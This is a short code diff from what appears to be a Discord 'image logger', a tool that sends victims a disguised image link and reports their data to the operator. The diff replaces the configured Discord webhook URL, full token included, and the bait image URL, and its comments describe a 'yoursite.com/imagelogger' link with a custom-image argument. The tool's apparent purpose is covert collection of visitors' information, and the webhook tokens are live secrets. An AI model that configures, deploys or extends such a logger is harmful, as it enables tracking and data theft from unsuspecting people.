@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1473570754808250390/6YOlQ0duZ5Z9rlzBIhNB8iF5XctxeaCO0yEaCZb-_vQo6FbgPkNT8kBILDipydvWvOmb",
-    "image": "https://cdn.discordapp.com/attachments/1473570727360991323/1473571201627586671/Black_and_Red_Modern_Gaming_YouTube_Channel_Logo.jpg?ex=6996b1a0&is=69956020&hm=ba593b33fa2d1c908017a7f75419d3dae8dd0896034ff849afaa8a999f891be6&", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1473588353881473097/wDN6JlYa5YcGnuvvHfttIDdkqyYUteF60KoLyFajrSZAjURzS5-UbkTAy-mWYjFE322u",
+    "image": "https://cdn.discordapp.com/attachments/1435289214253142046/1471798966097285238/image.png?ex=69962dda&is=6994dc5a&hm=02221d6acc42d9de6d501db8e6038f8b39f73c3695d6cb112c15478596ce64ac&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
